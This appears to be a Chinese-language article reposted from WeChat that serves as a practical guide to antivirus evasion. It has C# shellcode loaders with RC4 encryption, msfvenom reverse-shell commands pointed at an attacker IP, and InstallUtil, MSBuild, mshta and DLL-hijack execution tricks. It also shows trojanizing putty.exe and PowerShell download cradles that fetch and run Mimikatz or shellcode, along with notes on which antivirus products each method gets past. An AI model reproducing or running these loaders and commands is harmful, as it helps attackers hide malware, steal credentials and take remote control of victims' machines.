>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
MSF启动监听
Payload粘贴到位置
using System;
using System.Runtime.InteropServices;
namespace TCPMeterpreterProcess
{
  class Program
  {
    static void Main(string\[\] args)
    {
      byte\[\] shellcode = new byte\[\] {payload here};
      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM\_COMMIT, PAGE\_EXECUTE\_READWRITE);
      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
      IntPtr hThread = IntPtr.Zero;
      UInt32 threadId = 0;
      // prepare data
      IntPtr pinfo = IntPtr.Zero;
      // execute native code
      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
    private static UInt32 MEM\_COMMIT = 0x1000;
    private static UInt32 PAGE\_EXECUTE\_READWRITE = 0x40;
    \[DllImport("kernel32")\]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    \[DllImport("kernel32")\]
    private static extern bool VirtualFree(IntPtr lpAddress,
    UInt32 dwSize, UInt32 dwFreeType);
    \[DllImport("kernel32")\]
    private static extern IntPtr CreateThread(
      UInt32 lpThreadAttributes,
      UInt32 dwStackSize,
      UInt32 lpStartAddress,
      IntPtr param,
      UInt32 dwCreationFlags,
      ref UInt32 lpThreadId
);
    \[DllImport("kernel32")\]
    private static extern bool CloseHandle(IntPtr handle);
    \[DllImport("kernel32")\]
    private static extern UInt32 WaitForSingleObject(
      IntPtr hHandle,
      UInt32 dwMilliseconds
);
    \[DllImport("kernel32")\]
    private static extern IntPtr GetModuleHandle(
      string moduleName
);
    \[DllImport("kernel32")\]
    private static extern UInt32 GetProcAddress(
      IntPtr hModule,
      string procName
);
    \[DllImport("kernel32")\]
    private static extern UInt32 LoadLibrary(
      string lpFileName
);
    \[DllImport("kernel32")\]
    private static extern UInt32 GetLastError();
  }
}
Visual studio创建C#.net framework控制台程序编译可过杀软

```

#### 加密处理

```
生成payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
粘贴payload后编译加密
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
namespace Payload\_Encrypt\_Maker
{
  class Program
  {
    // 加密密钥，可以更改，加解密源码中保持KEY一致就行
    static byte\[\] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
    static byte\[\] IV = { 0x00, 0xcc, 0x00, 0x00, 0x00, 0xcc };
    static byte\[\] payload = { payload here };    // 替换成MSF生成的shellcode
    private static class Encryption\_Class
    {
      public static string Encrypt(string key, string data)
      {
        Encoding unicode = Encoding.Unicode;
        return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
      }
      public static byte\[\] Encrypt(byte\[\] key, byte\[\] data)
      {
        return EncryptOutput(key, data).ToArray();
      }
      private static byte\[\] EncryptInitalize(byte\[\] key)
      {
        byte\[\] s = Enumerable.Range(0, 256)
        .Select(i => (byte)i)
        .ToArray();
        for (int i = 0, j = 0; i < 256; i++)
        {
          j = (j + key\[i % key.Length\] + s\[i\]) & 255;
          Swap(s, i, j);
        }
        return s;
      }
      private static IEnumerable<byte> EncryptOutput(byte\[\] key, IEnumerable<byte> data)
      {
        byte\[\] s = EncryptInitalize(key);
        int i = 0;
        int j = 0;
        return data.Select((b) =>
        {
          i = (i + 1) & 255;
          j = (j + s\[i\]) & 255;
          Swap(s, i, j);
          return (byte)(b ^ s\[(s\[i\] + s\[j\]) & 255\]);
        });
      }
      private static void Swap(byte\[\] s, int i, int j)
      {
        byte c = s\[i\];
        s\[i\] = s\[j\];
        s\[j\] = c;
      }
    }
    static void Main(string\[\] args)
    {
      byte\[\] result = Encryption\_Class.Encrypt(KEY, payload);
      int b = 0;
      for (int i = 0; i < result.Length; i++)
      {
        b++;
        if (i == result.Length + 1)
        { Console.Write(result\[i\].ToString()); }
        if (i != result.Length) { Console.Write(result\[i\].ToString() + ","); }
      }
    }
  }
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpbNyGefQDXReEld4lyCWrKe9n8xKITZqR5aCf7QnTpVT7JKeTfvnM0w/640?wx_fmt=png)

```
编译解密
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;
namespace NativePayload\_Reverse\_tcp
{
  public class Program
{
    public static void Main()
    {
      Shellcode.Exec();
  }
}
class Shellcode
{
  public static void Exec()
  {
    string Payload\_Encrypted;
    Payload\_Encrypted = "payload here";
    string\[\] Payload\_Encrypted\_Without\_delimiterChar = Payload\_Encrypted.Split(',');
    byte\[\] \_X\_to\_Bytes = new byte\[Payload\_Encrypted\_Without\_delimiterChar.Length\];
    for (int i = 0; i < Payload\_Encrypted\_Without\_delimiterChar.Length; i++)
    {
      byte current = Convert.ToByte(Payload\_Encrypted\_Without\_delimiterChar\[i\].ToString());
      \_X\_to\_Bytes\[i\] = current;
    }
    // 解密密钥，可以更改，加解密源码中保持KEY一致就行
      byte\[\] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
      byte\[\] MsfPayload = Decrypt(KEY, \_X\_to\_Bytes);
      // 加载shellcode
      IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
      Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
      CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
      Thread.Sleep(2000);
    }
    public static byte\[\] Decrypt(byte\[\] key, byte\[\] data)
    {
      return EncryptOutput(key, data).ToArray();
    }
    private static byte\[\] EncryptInitalize(byte\[\] key)
    {
      byte\[\] s = Enumerable.Range(0, 256)
      .Select(i => (byte)i)
      .ToArray();
      for (int i = 0, j = 0; i < 256; i++)
      {
        j = (j + key\[i % key.Length\] + s\[i\]) & 255;
        Swap(s, i, j);
      }
      return s;
    }
    private static IEnumerable<byte> EncryptOutput(byte\[\] key, IEnumerable<byte> data)
    {
      byte\[\] s = EncryptInitalize(key);
      int i = 0;
      int j = 0;
      return data.Select((b) =>
      {
        i = (i + 1) & 255;
        j = (j + s\[i\]) & 255;
        Swap(s, i, j);
        return (byte)(b ^ s\[(s\[i\] + s\[j\]) & 255\]);
        });
    }
    private static void Swap(byte\[\] s, int i, int j)
    {
      byte c = s\[i\];
      s\[i\] = s\[j\];
      s\[j\] = c;
    }
    \[DllImport("kernel32.dll")\]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    \[DllImport("kernel32.dll")\]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  }
}

```

```
XOR/AES编码


```

```
与上文xor加密类似


```

#### **CSC+InstallUtil**

```
生成payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 20 -b '\\x00' LHOST=192.168.0.108 LPORT=12138 -f csharp -o cs.txt
Payload粘贴到InstallUtil-Shellcode.cs中使用csc编译

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpCqsyRCJ2w7FGv9QAicOZia3bbYQp1UCR5gEwXdWGibQ1Pz6BicG1c6Of5A/640?wx_fmt=png)

```
C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /unsafe /platform:x86 /out:C:\\Users\\y\\Desktop\\shell.exe C:\\Users\\y\\Desktop\\InstallUtil-ShellCode.cs

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpM3tGQuiaEtsNaiayrrciaLouKkC08cTdGoyWQmibhaak2icNKddnPFfNm0Q/640?wx_fmt=png)

```
执行
C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\y\\Desktop\\shell.exe

```

**Python 源码免杀  
**

#### **pyinstaller 加载 C 代码编译**

```
生成C格式payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
>msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
粘贴shellcode到shellcode+c.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\\Python27\\Scripts目录使用命令把py打包为exe
>python pyinstaller-script.py -F -w shellcode.py
会在目录下生成dist文件夹，exe文件就在里面

```

#### pyinstaller 加载 py 代码编译 (\*)

```
生成py格式payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
>msfvenom -p windows/meterpreter/reverse\_tcp LPORT=12138 LHOST=192.168.0.108 -e x86/shikata\_ga\_nai -i 11 -f py -o /var/www/html/1.py
粘贴shellcode到shellcode+py.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\\Python27\\Scripts目录使用命令把py打包为exe
>python pyinstaller-script.py --console --onefile shellcode.py
会在目录下生成dist文件夹，exe文件就在里面

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpo8hjzicsz3yYNo1a0W4R65SRpJyZOR0eJoyIepVG7PJeL7q5xKvzhHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpqeHEk5j52xAibNFXLtAcJk54zbBHGqOFrmG4ia1MRfNQCV1l44Q4LaiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpM1lsexSDX9Gkj1ic0kBkjOTmkMoswEyBsVkicu9ppyVtnIv0hgVNk6Sw/640?wx_fmt=png)

#### Py2exe 打包 exe

```
生成raw格式payload
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
>msfvenom -p python/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/shell.py
在32位系统上安装python、py2exe
创建setup.py放置同一目录

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpv7a7amIQUZTWKggMBUXgxE60oh90fHQs0SXHA3zbjzwePvjMCqIBMw/640?wx_fmt=png)

```
from distutils.core import setup
import py2exe
setup(
name = "Meter",
description = "Python-based App",
version = "1.0",
console = \["shell.py"\],
options = {"py2exe":{"bundle\_files":1,"packages":"ctypes","includes":"base64,sys,socket,struct,time,code,platform,getpass,shutil",}},
zipfile = None
)
执行打包命令
>python setup.py py2exe
会在当前目录生成dist文件夹，打包好的exe在里面

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp0ib1hbTFP7gnicW3lyWe1s2Vict9y1LBTBhzaDOjM1YuH0KuhbduWtyiag/640?wx_fmt=png)Base64 编码 + Pyinstaller 打包

```
MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe
>msfvenom -p windows/meterpreter/reverse\_tcp --encrypt base64 LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.c
Shellcode粘贴在shellcode+base64+c.py中
>python pyinstaller-script.py -F -w shellcode.py
会在目录下生成dist文件夹，exe文件就在里面

```

```
加载器分离


```

##### hex

```
生成c格式payload
>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 6 -b '\\x00' lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
下载k8final

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp6piaUwRWn9S0libHd71Jg3AnGb1lTh1bp3RnTBiaCeaqWrcctS9KBVKzw/640?wx_fmt=png)

```
粘贴shellcode进去


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpg45ib0yu7icdqjG86zgKfUK6MwVWoPYARxBSYYZLcngpPrUhzicrI46vw/640?wx_fmt=png)

```
使用

```

```
https://github.com/k8gege/scrun

```

```
或
>python scrun.py xxx
或
编译ScRunHex.py为exe

```

##### Base64(\*)

```
生成c格式payload
>msfvenom -p windows/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 6 -b '\\x00' lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c
下载k8final

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpUEx5jGIvFDBObHg7U2QzczdkxmQ3wccBXvRooFHuKMwZDzE0axJIGw/640?wx_fmt=png)

```
粘贴shellcode进去


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFps0ydwX08hmQ8tSKn9tcMlVvUDQYvtpNwpp95x1Yk2KJwibjz7EwGe2A/640?wx_fmt=png)

```
进行hex编码后，粘贴进去base64编码


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpc7uLh7setibo4kMSrFEbCxjDsoKppaY2PzVJXre8F3eBf8WEh1oDrHg/640?wx_fmt=png)

```
看系统位数编译ScRunBase.py文件，使用pyinstaller打包为exe后执行
https://gitee.com/RichChigga/scrun/blob/master/ScRunBase64.py
>python pyinstaller-script.py -F -w ScRunBase64.py

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp2Xkbn1cLib9yoLS0H875f6fAKWA72cRVxM8A6UXEEdJ2xiaKlF7oQEJA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpbuSiad5VJYgDfFCuic8Xc549snrkicFZ7ibXIGql6ueib7jZZtIbxS0gTUw/640?wx_fmt=png)

### DLL 劫持

```
白dll劫持
Processmonitor查找程序加载的dll
使用stud\_pe加载dll进去
或
生成payload免杀好粘贴进去，查看目标上有什么软件，本地查找可劫持的dll,劫持好文件后传上去。

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpJAicbq8bj2eBAbvlHXicEpVCJynJ2mOZjLTjxCiczlYicV5T2WCcgYssog/640?wx_fmt=png)

### MSBuild  

```
链接
https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
>msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.0.108 lport=12138 -f csharp
远程执行
>wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild\_nps.xml
要设置自动迁移进程

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpJRZaLFSuQ74LYdprzaJichQk2R8S4hjW3CxAlstVjjffOw5mIVM0QXw/640?wx_fmt=png)

### GreatSCT

```
\>use Bypass
>list
>use regasm/meterpreter/rev\_tcp.py
>msfconsole -r /usr/share/greatsct-output/handlers/payload.rc

```

```
Mshta


```

```
https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta
生成
>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.bin
>cat 1.bin |base64 -w 0

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpURHBBvV98FHx2lWFf28ZBZop7ayF11TAbSI367w14AmxeIx4AE5g3w/640?wx_fmt=png)

```
编码后的内容复制到


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp3yZngPpns49IFdUAErdMI9iapXsVnOycWLdwPcErrL3mkEg8lwiaeibfQ/640?wx_fmt=png)

```
执行


```

```
\>mshta http://192.168.0.106:1222/1.hta
360执行检测出来，静态动态无法检测、火绒无法检测

```

### InstallUtil

```
内网文章中有介绍

```

### Veil

```
\>use 1选择evasion模块
>list查看可用payload
>use 7 选择c格式的payload
>set LHOST/LPORT设置回连IP和端口
>generate生成

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpKbGQNEUmAIIc9VcUtRbaD4Pjl9N5EiaVyThfay8vjPs6mHLx1pBhibicQ/640?wx_fmt=png)

```
直接生成的exe可能会被查杀，目前可过360，不能过火绒
使用minGW-w64编译C文件
>gcc -o vel.exe veil.c -l ws2\_32

```

### RC4

```
\>msfvenom -p windows/x64/meterpreter/reverse\_tcp\_rc4 lhost=192.168.0.108 lport=3333 RC4PASSWORD=123qwe!@# -f c

```

```
捆绑


```

```
\>msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata\_ga\_nai -x PsExec64.exe  -i 15 -f exe -o /var/www/html/payload4.exe

```

```
Evasion模块


```

```
\>show evasion

```

### Phantom-Evasion

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpr5iaqME2jL5hPdMlnxLTkO9rGqPb0nE0w7ytMhDicYClsUzYqOKod7GA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpOZhWpoibpH6bC49bicep87iccicTaBHmHKOFwicvibe54rLRCgd54Fxcn7iaw/640?wx_fmt=png)

### Shellter

```
仅支持32位程序
>apt install shellter
指定一个exe文件

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpNTzE7iaeGoo8h9rrLtJJBhUwL3ewN8MPxc0mnHdpVUYKFpndHd5tzhA/640?wx_fmt=png)

```
选择payload


```

### the-backdoor-factory

```
查看是否支持捆绑
>python backdoor.py -f /root/Desktop/putty.exe -S
查看此文件支持哪些payload
>python backdoor.py -f /root/Desktop/putty.exe -s show
reverse\_shell\_tcp\_inline对应msf
set payload windows/meterpreter/reverse\_tcp
meterpreter\_reverse\_https\_threaded应msf
set payload windows/meterpreter/reverse\_https
iat\_reverse\_tcp\_stager\_threaded修复IAT
user\_supplied\_shellcode\_threaded自定义payload
参数
-s 指定payload
-H 回连地址
-P 回连端口
-J 多代码裂缝注入
>python backdoor.py -f ~/putty.exe -s iat\_reverse\_tcp\_stager\_threaded -H 192.168.0.108 -P 12138 -J -o payload.exe
后门生成在backdoored目录
或
生成payload
msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata\_ga\_nai -i 5 -f raw -o shellcode.c
自定义
>python backdoor.py -f /root/putty.exe -s user\_supplied\_shellcode\_threaded -U /root/shellcode.c  -o payload2.exe

```

### zirikatu

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpEDuPyVDj3EgHhYzPmUlK3r81pL8KXZxThfep7I2VFeFYXzfLaGgZPQ/640?wx_fmt=png)

### hanzoInjection

```
https://github.com/P0cL4bs/hanzoInjection
生成
>msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.0.108 lport=12138 -f raw -o /var/www/html/1.bin
>HanzoInjection.exe -p 1.bin -o 1.cs
编译1.cs
属性-生成-允许不安全代码

```

PowerShell 免杀
-------------

### 直接生成

```
\>msfvenom -p windows/x64/meterpreter/reverse\_tcp -e x86/shikata\_ga\_nai -i 15 -b '\\x00' lhost=192.168.0.108 lport=12138 -f psh -o /var/www/html/1.ps1
执行
>powershell -ep bypass -noexit -file 1.ps1
Powershell行为检测bypass
>powershell -noexit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"

```

```
Invoke-Shellcode加载


```

```
生成code
>msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f powershell -o /var/www/html/1.ps1
目标执行
> powershell -ep bypass
> IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/powersploit/CodeExecution/Invoke-Shellcode.ps1')
> IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.108/1.ps1')
> Invoke-Shellcode -Shellcode ($buf) -Force

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpfVsS2OaDvy3p24TWiaJYLjBneMsz5rZwphIdfKsTI9crqlkGPqrckLQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpPEKsvbYq4dLWRxC0kyxVEGbsqBQYceoZzyJtmE2zsXENCeEOb9k1YQ/640?wx_fmt=png)

```
防护软件没反应


```

### Invoke-Obfuscation

```
https://github.com/danielbohannon/Invoke-Obfuscation
生成code
>msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.0.108 LPORT=12138 -f psh -o /var/www/html/1.ps1
>powershell -ep bypass
>Import-Module .\\Invoke-Obfuscation.psd1
>Invoke-Obfuscation
>set scriptpath C:\\Users\\y\\Desktop\\1.ps1
>encoding
>3 指定编码方式
>out C:\\Users\\y\\Desktop\\ok.ps1 保存

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp7CpVwkroIjHIyV9OdCLbXvlEsVSeyLbLfefHwqvOePVpfRP9Oe4ovA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpUYzYl988v0vuBD4QXWb28iauU2o9ZpI52ICoSswMsqm1vJ5UsmO6hsQ/640?wx_fmt=png)

```
执行
>powershell -ep bypass -noexit -file ok.ps1

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp9DMcibPbpy3Yt9Tvwx8zxXxqunhyzEgUy9rBPFppBAPJEsl7ZMWpXmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpagMt2gHxc9aseRUicPgG26lLm6ofTO2gfn7AGny5xeIgyI0lWFxzWAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpnxGu1eYNDxUth2ClK9du63rkvLSpRia3aAT070icFYvzSI0GEq7UFI5g/640?wx_fmt=png)

### Xencrypt

```
https://github.com/the-xentropy/xencrypt/blob/master/xencrypt.ps1
>Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100 递归分层躲避动态查杀

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpC9yueH3SSQR9QZViaIKicibpQGzhOQdYgSyibl56bNiaeuNPcTXw9IGfjhQ/640?wx_fmt=png)

```
\>Invoke-Xencrypt -infile .\\Invoke-Mimikatz.ps1 -outfile mimi.ps1

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp8v4skl1EtG7gfee3XuicmFogd7RqR6yJJdSwbDfPCOeJxsDp9fRLiakQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp0RunN0yzoibGJwwyMcHb1iaBumDl5hedpChrvrPuNJyQQqbq3cjqOf9Q/640?wx_fmt=png)

### PyFuscation

```
https://github.com/CBHue/PyFuscation
对函数，参数，变量进行混淆
>python3 PyFuscation.py -fvp --ps Invoke-Mimikatz.ps1

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpUKic40Qib5qHcRjyQsI8621PKNyIgA8yxe4V6MpPW0bac4dET7YghvBg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpImvZTIdQF58u4pd22Yuh3JXy3BNKNA61B4KlxcEv5DiaEjBVDTwKj4g/640?wx_fmt=png)

### 拆分 + C 编译

```
#include<stdio.h>
#include<stdlib.h>
int main(){
system("powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)");
return 0;
}

```

### 行为检测

```
\>powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz"

```

```
Out-EncryptedScript


```

```
http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1
>Out-EncryptedScript -ScriptPath .\\Invoke-Mimikatz.ps1 -Password shabiisme -Salt 123456

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpJaNUzPFfRIia87Q6mfkJX8ATo7FcXsY5r0ibV57Bibhk0Kt4xiaDZqshvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp9zHGGymiaccguqTiaTqvvvcesqjKgiaEfN330SVmIWtmPXa3qUaevOgnA/640?wx_fmt=png)

```
PS > IEX(New-Object Net.WebClient).DownloadString("http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1")
PS > \[String\] $cmd = Get-Content .\\evil.ps1
PS > Invoke-Expression $cmd
PS > $decrypted = de shabiisme 123456
PS > Invoke-Expression $decrypted
PS > Invoke-Mimikatz

```

```
分块免杀


```

```
生成
msfvenom -p windows/x64/meterpreter\_reverse\_https LHOST=192.168.0.108 LPORT=443 -f psh-net -o shity\_shellcode.ps

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp6eAqibJvPBCw93QN1yDDp3gSovWhC2g1wxPJZKoCDXCzrVV7S09dxDA/640?wx_fmt=png)

```
先来测试一下，把ps1文件的shellcode换成一段无害的字符串


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp7fXKgFYmvlcS01xIPBPU9kiaAfmDTouiamqGYOB5sduxCQADDfcLhbpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpkrreUTG0HNwetxxHH6bYx8Cu5ficwicbIewnbibtMpHHdabz0s0rWSN3g/640?wx_fmt=png)

结果发现还是被查杀了

```
这表明大多数检测来自PowerShell模板，而不是Shellcode本身。
下面几种bypass方法
1.将字符串分成几部分并创建中间变量；
2.添加大量垃圾备注；
3.添加一些垃圾指令，例如循环或睡眠指令（对于沙盒有用）。
\[DllImport("kernel32.dll")\]
变为
\[DllImport("ke"+"rne"+"l32.dll")\] #可绕过赛门铁克
$przdE.ReferencedAssemblies.AddRange(@("System.dll",\[PsObject\].Assembly.Location))
变为
$magic="Syst"+"em"+".dll";
$przdE.ReferencedAssemblies.AddRange(@($magic,\[PsObject\].Assembly.Location))
分割shellcode
$sc0=<shellcode的第1部分>; …$sc7=<shellcode的第8部分>; \[Byte\[\]\]$tcomplete\_sc=\[System.Convert\]::FromBase64String($sc0+$sc1+…+$sc7)
一些细节可参照
https://raw.githubusercontent.com/kmkz/Pentesting/master/AV\_Evasion/AV\_Bypass.ps1
我不太懂汇编语言，所以没有添加无害指令。
这里直接使用一键生成的bash脚本，有时间的可以读读里面的命令
https://github.com/darksh3llRU/tools/blob/master/psh-net\_shellcode\_fastchange.sh
这个脚本是生成个hta的，脚本以1337个字符来分块

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpxCx0WtO54ibA6TKz9sTXMnQicIC4XZBKgPfy6Hbn9V2LKEenLA7238Qg/640?wx_fmt=png)

我测试的时候 1337 个字符会被赛门铁克查杀到，我这里修改成 250 个字符来分块  

